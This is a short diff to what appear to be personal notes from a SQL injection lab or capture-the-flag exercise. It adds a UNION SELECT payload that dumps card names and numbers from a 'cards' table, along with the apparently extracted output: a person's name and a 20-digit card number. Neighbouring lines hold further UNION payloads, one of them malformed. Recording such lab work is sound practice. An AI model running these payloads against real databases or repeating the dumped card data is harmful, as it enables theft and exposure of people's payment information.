@@ -248,6 +248,14 @@ UNION SELECT card_id,2,3 FROM cards--
 
 ![[Pasted image 20260604150407.png]]
 
+UNION SELECT 1,card_name,card_no FROM cards--
+![[Pasted image 20260604161128.png]]
+
+**Kaan Onar**
+
+73647582349006746185
+
+![[Pasted image 20260604161315.png]]
 
 UNION SELECT card_id INTEGER PRIMARY KEY, user_id INTEGER, card_name TEXT, card_no TEXT, FROM cards--
 
